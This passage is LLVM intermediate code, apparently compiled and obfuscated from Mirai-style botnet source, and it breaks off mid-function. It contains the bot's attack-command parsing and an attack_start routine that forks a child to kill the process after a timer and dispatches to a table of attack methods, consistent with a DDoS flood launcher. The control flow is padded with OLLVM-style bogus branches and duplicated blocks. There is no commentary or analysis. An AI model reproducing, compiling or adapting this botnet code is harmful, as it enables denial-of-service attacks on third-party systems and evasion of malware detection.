originalBBpart256:                                ; preds = %originalBB54
  br label %427

; <label>:341:                                    ; preds = %originalBBpart252
  %342 = load i8*, i8** %3, align 8
  %343 = getelementptr inbounds i8, i8* %342, i32 1
  store i8* %343, i8** %3, align 8
  %344 = load i8, i8* %342, align 1
  store i8 %344, i8* %12, align 1
  %345 = load i32, i32* %4, align 4
  %346 = sext i32 %345 to i64
  %347 = sub i64 %346, 1
  %348 = trunc i64 %347 to i32
  store i32 %348, i32* %4, align 4
  %349 = load i32, i32* %4, align 4
  %350 = load i8, i8* %12, align 1
  %351 = zext i8 %350 to i32
  %352 = icmp slt i32 %349, %351
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %341
  br label %427

; <label>:354:                                    ; preds = %341
  %355 = load i8, i8* %12, align 1
  %356 = zext i8 %355 to i32
  %357 = add nsw i32 %356, 1
  %358 = sext i32 %357 to i64
  %359 = call noalias i8* @calloc(i64 %358, i64 1) #6
  %360 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %361 = load i32, i32* %5, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %363, i32 0, i32 0
  store i8* %359, i8** %364, align 8
  %365 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %366 = load i32, i32* %5, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %368, i32 0, i32 0
  %370 = load i8*, i8** %369, align 8
  %371 = load i8*, i8** %3, align 8
  %372 = load i8, i8* %12, align 1
  %373 = zext i8 %372 to i32
  call void @util_memcpy(i8* %370, i8* %371, i32 %373)
  %374 = load i8, i8* %12, align 1
  %375 = zext i8 %374 to i32
  %376 = load i8*, i8** %3, align 8
  %377 = sext i32 %375 to i64
  %378 = getelementptr inbounds i8, i8* %376, i64 %377
  store i8* %378, i8** %3, align 8
  %379 = load i8, i8* %12, align 1
  %380 = zext i8 %379 to i32
  %381 = load i32, i32* %4, align 4
  %382 = sub nsw i32 %381, %380
  store i32 %382, i32* %4, align 4
  br label %383

; <label>:383:                                    ; preds = %354
  %384 = load i32, i32* %5, align 4
  %385 = add nsw i32 %384, 1
  store i32 %385, i32* %5, align 4
  br label %266

; <label>:386:                                    ; preds = %266
  %387 = load i32, i32* @x.7
  %388 = load i32, i32* @y.8
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %386
  %395 = load i32, i32* @x.7
  %396 = load i32, i32* @y.8
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %403

; <label>:403:                                    ; preds = %originalBBpart260, %250
  %404 = load i32, i32* @x.7
  %405 = load i32, i32* @y.8
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %403
  %412 = call i32* @__errno_location() #7
  store i32 0, i32* %412, align 4
  %413 = load i32, i32* %6, align 4
  %414 = load i8, i8* %7, align 1
  %415 = load i8, i8* %8, align 1
  %416 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %417 = load i8, i8* %9, align 1
  %418 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %413, i8 zeroext %414, i8 zeroext %415, %struct.attack_target* %416, i8 zeroext %417, %struct.attack_option* %418)
  %419 = load i32, i32* @x.7
  %420 = load i32, i32* @y.8
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %427

; <label>:427:                                    ; preds = %originalBBpart264, %353, %originalBBpart256, %originalBBpart246, %249, %125, %originalBBpart220, %89, %originalBBpart24, %originalBBpart2
  %428 = load i32, i32* @x.7
  %429 = load i32, i32* @y.8
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %427
  %436 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %437 = icmp ne %struct.attack_target* %436, null
  %438 = load i32, i32* @x.7
  %439 = load i32, i32* @y.8
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %437, label %446, label %449

; <label>:446:                                    ; preds = %originalBBpart268
  %447 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %448 = bitcast %struct.attack_target* %447 to i8*
  call void @free(i8* %448) #6
  br label %449

; <label>:449:                                    ; preds = %446, %originalBBpart268
  %450 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %451 = icmp ne %struct.attack_option* %450, null
  br i1 %451, label %452, label %472

; <label>:452:                                    ; preds = %449
  %453 = load i32, i32* @x.7
  %454 = load i32, i32* @y.8
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %452
  %461 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %462 = load i8, i8* %9, align 1
  %463 = zext i8 %462 to i32
  call void @free_opts(%struct.attack_option* %461, i32 %463)
  %464 = load i32, i32* @x.7
  %465 = load i32, i32* @y.8
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %472

; <label>:472:                                    ; preds = %originalBBpart272, %449
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  %473 = load i8*, i8** %3, align 8
  %474 = getelementptr inbounds i8, i8* %473, i32 1
  store i8* %474, i8** %3, align 8
  %475 = load i8, i8* %473, align 1
  store i8 %475, i8* %7, align 1
  %476 = load i32, i32* %4, align 4
  %477 = sext i32 %476 to i64
  %_ = shl i64 %477, 1
  %_7 = sub i64 %477, 1
  %gen = mul i64 %_7, 1
  %_8 = shl i64 %477, 1
  %_9 = sub i64 %477, 1
  %gen10 = mul i64 %_9, 1
  %_11 = sub i64 0, %477
  %gen12 = add i64 %_11, 1
  %_13 = sub i64 0, %477
  %gen14 = add i64 %_13, 1
  %478 = sub i64 %477, 1
  %479 = trunc i64 %478 to i32
  store i32 %479, i32* %4, align 4
  %480 = load i32, i32* %4, align 4
  %481 = icmp eq i32 %480, 0
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %101
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %126
  %482 = load i8, i8* %8, align 1
  %483 = zext i8 %482 to i64
  %484 = call noalias i8* @calloc(i64 %483, i64 24) #6
  %485 = bitcast i8* %484 to %struct.attack_target*
  store %struct.attack_target* %485, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %147
  %486 = load i32, i32* %5, align 4
  %487 = load i8, i8* %8, align 1
  %488 = zext i8 %487 to i32
  %489 = icmp slt i32 %486, %488
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %210
  %490 = load i32, i32* %5, align 4
  %_31 = sub i32 0, %490
  %gen32 = add i32 %_31, 1
  %_33 = sub i32 0, %490
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %490, 1
  %gen36 = mul i32 %_35, 1
  %491 = add nsw i32 %490, 1
  store i32 %491, i32* %5, align 4
  br label %originalBB30

originalBB40alteredBB:                            ; preds = %originalBB40, %229
  %492 = load i32, i32* %4, align 4
  %493 = sext i32 %492 to i64
  %494 = icmp ult i64 %493, 1
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %275
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %292
  %495 = load i8*, i8** %3, align 8
  %496 = getelementptr inbounds i8, i8* %495, i32 1
  store i8* %496, i8** %3, align 8
  %497 = load i8, i8* %495, align 1
  %498 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %499 = load i32, i32* %5, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %501, i32 0, i32 1
  store i8 %497, i8* %502, align 8
  %503 = load i32, i32* %4, align 4
  %504 = sext i32 %503 to i64
  %_49 = sub i64 %504, 1
  %gen50 = mul i64 %_49, 1
  %505 = sub i64 %504, 1
  %506 = trunc i64 %505 to i32
  store i32 %506, i32* %4, align 4
  %507 = load i32, i32* %4, align 4
  %508 = sext i32 %507 to i64
  %509 = icmp ult i64 %508, 1
  br label %originalBB48

originalBB54alteredBB:                            ; preds = %originalBB54, %324
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %386
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %403
  %510 = call i32* @__errno_location() #7
  store i32 0, i32* %510, align 4
  %511 = load i32, i32* %6, align 4
  %512 = load i8, i8* %7, align 1
  %513 = load i8, i8* %8, align 1
  %514 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %515 = load i8, i8* %9, align 1
  %516 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %511, i8 zeroext %512, i8 zeroext %513, %struct.attack_target* %514, i8 zeroext %515, %struct.attack_option* %516)
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %427
  %517 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %518 = icmp ne %struct.attack_target* %517, null
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %452
  %519 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %520 = load i8, i8* %9, align 1
  %521 = zext i8 %520 to i32
  call void @free_opts(%struct.attack_option* %519, i32 %521)
  br label %originalBB70
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.9
  %8 = load i32, i32* @y.10
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %24 = call i32 @fork() #6
  store i32 %24, i32* %21, align 4
  %25 = load i32, i32* %21, align 4
  %26 = icmp eq i32 %25, -1
  %27 = load i32, i32* @x.9
  %28 = load i32, i32* @y.10
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %21, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %55

; <label>:38:                                     ; preds = %35, %originalBBpart2
  %39 = load i32, i32* @x.9
  %40 = load i32, i32* @y.10
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* @x.9
  %48 = load i32, i32* @y.10
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

; <label>:55:                                     ; preds = %35
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = call i32 @fork() #6
  store i32 %64, i32* %22, align 4
  %65 = load i32, i32* %22, align 4
  %66 = icmp eq i32 %65, -1
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %66, label %75, label %76

; <label>:75:                                     ; preds = %originalBBpart28
  call void @exit(i32 0) #8
  unreachable

; <label>:76:                                     ; preds = %originalBBpart28
  %77 = load i32, i32* @x.9
  %78 = load i32, i32* @y.10
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %76
  %85 = load i32, i32* %22, align 4
  %86 = icmp eq i32 %85, 0
  %87 = load i32, i32* @x.9
  %88 = load i32, i32* @y.10
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %86, label %95, label %100

; <label>:95:                                     ; preds = %originalBBpart212
  %96 = load i32, i32* %15, align 4
  %97 = call i32 @sleep(i32 %96)
  %98 = call i32 @getppid() #6
  %99 = call i32 @kill(i32 %98, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:100:                                    ; preds = %originalBBpart212
  store i32 0, i32* %23, align 4
  br label %101

; <label>:101:                                    ; preds = %originalBBpart221, %100
  %102 = load i32, i32* %23, align 4
  %103 = load i8, i8* @methods_len, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp slt i32 %102, %104
  br i1 %105, label %106, label %166

; <label>:106:                                    ; preds = %101
  %107 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %108 = load i32, i32* %23, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %107, i64 %109
  %111 = load %struct.attack_method*, %struct.attack_method** %110, align 8
  %112 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %111, i32 0, i32 1
  %113 = load i8, i8* %112, align 8
  %114 = zext i8 %113 to i32
  %115 = load i8, i8* %16, align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %114, %116
  br i1 %117, label %118, label %146

; <label>:118:                                    ; preds = %106
  %119 = load i32, i32* @x.9
  %120 = load i32, i32* @y.10
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %118
  %127 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %128 = load i32, i32* %23, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %127, i64 %129
  %131 = load %struct.attack_method*, %struct.attack_method** %130, align 8
  %132 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %131, i32 0, i32 0
  %133 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %132, align 8
  %134 = load i8, i8* %17, align 1
  %135 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %136 = load i8, i8* %19, align 1
  %137 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %133(i8 zeroext %134, %struct.attack_target* %135, i8 zeroext %136, %struct.attack_option* %137)
  %138 = load i32, i32* @x.9
  %139 = load i32, i32* @y.10
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %166

; <label>:146:                                    ; preds = %106
  br label %147

; <label>:147:                                    ; preds = %146
  %148 = load i32, i32* @x.9
  %149 = load i32, i32* @y.10
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %147
  %156 = load i32, i32* %23, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %23, align 4
  %158 = load i32, i32* @x.9
  %159 = load i32, i32* @y.10
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart221, label %originalBB18alteredBB

originalBBpart221:                                ; preds = %originalBB18
  br label %101

; <label>:166:                                    ; preds = %originalBBpart216, %101
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %167 = alloca i32, align 4
  %168 = alloca i8, align 1
  %169 = alloca i8, align 1
  %170 = alloca %struct.attack_target*, align 8
  %171 = alloca i8, align 1
  %172 = alloca %struct.attack_option*, align 8
  %173 = alloca i32, align 4
  %174 = alloca i32, align 4
  %175 = alloca i32, align 4
  store i32 %0, i32* %167, align 4
  store i8 %1, i8* %168, align 1
  store i8 %2, i8* %169, align 1
  store %struct.attack_target* %3, %struct.attack_target** %170, align 8
  store i8 %4, i8* %171, align 1
  store %struct.attack_option* %5, %struct.attack_option** %172, align 8
  %176 = call i32 @fork() #6
  store i32 %176, i32* %173, align 4
  %177 = load i32, i32* %173, align 4
  %178 = icmp eq i32 %177, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %179 = call i32 @fork() #6
  store i32 %179, i32* %22, align 4
  %180 = load i32, i32* %22, align 4
  %181 = icmp eq i32 %180, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %76
  %182 = load i32, i32* %22, align 4
  %183 = icmp eq i32 %182, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %118
  %184 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %185 = load i32, i32* %23, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %184, i64 %186
  %188 = load %struct.attack_method*, %struct.attack_method** %187, align 8
  %189 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %188, i32 0, i32 0
  %190 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %189, align 8
  %191 = load i8, i8* %17, align 1
  %192 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %193 = load i8, i8* %19, align 1
  %194 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %190(i8 zeroext %191, %struct.attack_target* %192, i8 zeroext %193, %struct.attack_option* %194)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %147
  %195 = load i32, i32* %23, align 4
  %_ = shl i32 %195, 1
  %_19 = sub i32 %195, 1
  %gen = mul i32 %_19, 1
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %23, align 4
  br label %originalBB18
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %84

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %78, %9
  %11 = load i32, i32* @x.11
  %12 = load i32, i32* @y.12
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %19, %20
  %22 = load i32, i32* @x.11
  %23 = load i32, i32* @y.12
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %81

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @x.11
  %32 = load i32, i32* @y.12
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %39, i64 %41
  %43 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  %45 = icmp ne i8* %44, null
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %77

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i32, i32* @x.11
  %56 = load i32, i32* @y.12
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %63, i64 %65
  %67 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %66, i32 0, i32 0
  %68 = load i8*, i8** %67, align 8
  call void @free(i8* %68) #6
  %69 = load i32, i32* @x.11
  %70 = load i32, i32* @y.12
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %77

; <label>:77:                                     ; preds = %originalBBpart28, %originalBBpart24
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  br label %10

; <label>:81:                                     ; preds = %originalBBpart2
  %82 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %83 = bitcast %struct.attack_option* %82 to i8*
  call void @free(i8* %83) #6
  br label %84

; <label>:84:                                     ; preds = %81, %8
  %85 = load i32, i32* @x.11
  %86 = load i32, i32* @y.12
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %93 = load i32, i32* @x.11
  %94 = load i32, i32* @y.12
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %101 = load i32, i32* %5, align 4
  %102 = load i32, i32* %4, align 4
  %103 = icmp slt i32 %101, %102
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %104 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %104, i64 %106
  %108 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %107, i32 0, i32 0
  %109 = load i8*, i8** %108, align 8
  %110 = icmp ne i8* %109, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %111 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %111, i64 %113
  %115 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  call void @free(i8* %116) #6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %51, %4
  %12 = load i32, i32* @x.13
  %13 = load i32, i32* @y.14
  %14 = sub i32 %12, 1
